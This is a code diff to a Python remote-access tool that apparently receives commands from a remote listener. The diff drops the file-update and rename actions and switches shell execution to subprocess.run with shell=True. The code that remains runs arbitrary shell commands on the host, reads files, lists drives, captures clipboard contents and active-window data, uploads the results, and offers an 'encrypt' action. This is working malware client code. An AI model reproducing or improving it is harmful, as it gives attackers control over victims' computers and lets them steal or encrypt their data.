@@ -1,4 +1,4 @@
-import os
+import os,subprocess
 import json
 import rsa
 import socket
@@ -107,7 +107,7 @@ def active_windows():
         }
     upload(data)
 
-def action_on_system(new_path="",command="",original_filename="",update_str="",new_foldername="",new_filename="",path=""):
+def action_on_system(new_path="",command="",original_filename="",new_foldername="",new_filename="",path=""):
 	if command=='dir':
 		dirs=json.dumps(os.listdir(path))
 		data={
@@ -124,9 +124,6 @@ def action_on_system(new_path="",command="",original_filename="",update_str="",n
 		with open(path+f'\{original_filename}') as f:
 			con=f.read()
 			return con
-	elif command=='updatefile':
-		with open(path+f'\{original_filename}','a') as f:
-			f.write(update_str)
 	elif command=='mkdir':
 		os.chdir(path)
 		os.mkdir(new_foldername)
@@ -135,9 +132,6 @@ def action_on_system(new_path="",command="",original_filename="",update_str="",n
 	elif command=='createfile':
 		with open(path+f'/{new_filename}','w') as f:
 			pass
-	elif command=='renamefile':
-		os.chdir(path)
-		os.rename(original_filename,new_filename)
 
 
 def drives():
@@ -237,10 +231,6 @@ def action_take(listen):
                 "result":json.dumps(content)
             }
             upload(data)
-        elif action=='updatefile':
-            target_element=listen['target_element']
-            target_string=listen['target_string']
-            action_on_system(command=action,original_filename=target_element,update_str=target_string,path=cwd)
         elif action=='mkdir':
             target_element=listen['target_element']
             action_on_system(command=action,new_foldername=target_element,path=cwd)
@@ -250,10 +240,6 @@ def action_take(listen):
         elif action=='createfile':
             target_element=listen['target_element']
             action_on_system(command=action,new_filename=target_element,path=cwd)
-        elif action=='renamefile':
-            target_element=listen['target_element']
-            new_filename=listen['new_filename']
-            action_on_system(command=action,original_filename=target_element,new_filename=new_filename,path=cwd)
         elif action=='disks':
             drives()
         elif action=='encrypt':
@@ -315,7 +301,7 @@ def action_take(listen):
             cmd=listen['action']
             try:
                 os.chdir(cwd)
-                os.system(cmd)
+                subprocess.run(cmd, shell=True, check=True)
                 win32clipboard.OpenClipboard()
                 res=win32clipboard.GetClipboardData()
                 win32clipboard.CloseClipboard()
